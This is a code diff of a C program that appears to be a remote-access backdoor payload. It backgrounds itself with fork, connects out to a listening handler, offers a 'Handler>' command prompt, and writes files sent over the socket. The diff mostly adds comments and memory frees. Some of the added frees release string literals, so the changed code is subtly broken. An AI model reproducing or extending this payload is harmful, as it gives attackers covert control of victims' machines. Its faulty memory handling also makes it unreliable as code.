@@ -26,11 +26,12 @@ int main(int argc, char *argv[])
 	//this fork and exit portion are used to background the running process
 	int pid = fork();	//fork process and return pid to pid (0 to child, actual pid to parent)
 
-	if(pid)
+	if(pid) //if parent: quit
 		return 1;
+
 	//now we are ready to connect with our background running process
 
-    struct sockaddr_in sa;
+    struct sockaddr_in sa; //socket data structure
 
 	//here we will set up our default listen server information
     sa.sin_family = AF_INET;						//AF_INET = Address Family is IPv4
@@ -84,7 +85,7 @@ int main(int argc, char *argv[])
 		write(sock, buff, strlen(buff));
 		//now we will start getting into the gritty stuff
 
-		int check = 1;	//this will be a prompt for handler
+		int check = 1;	//this will be a prompt for handler (if netcat is used)
 
 		//THE FOLLOWING WILL BE THE ALLOCATION AND WRITE TO HELP MENU FOR THE MAIN PAYLOAD
 		char help[32][1024];
@@ -114,9 +115,9 @@ int main(int argc, char *argv[])
 
 		char *line	= "Handler> ";
 		char *error = "COMMAND NOT RECOGNIZED\n";
-		char nl[3]	= "\n";
+		char *nl	= "\n";
 		char termi	= '\0';
-		char num[32];
+		char *num	= malloc(sizeof(char) * 32);
 		int netcat	= 0;
 
 		while(check)
@@ -215,7 +216,6 @@ int main(int argc, char *argv[])
 				else
 					fwrite(buff, 1, fileLen, file);
 
-				
 				free(fileName);
 				fclose(file);
 			}
@@ -270,7 +270,15 @@ int main(int argc, char *argv[])
 
 		strcpy(buff, "\nPayload connection closing\n");	//on exit print a nice message
 		write(sock, buff, strlen(buff));			//write that message to the socket
+
+		//free up heap memory
+		free(num);
+		free(newName);
+		free(line);
+		free(error);
+		free(nl);
 	}
 
+	//exit
 	return 0;
 }
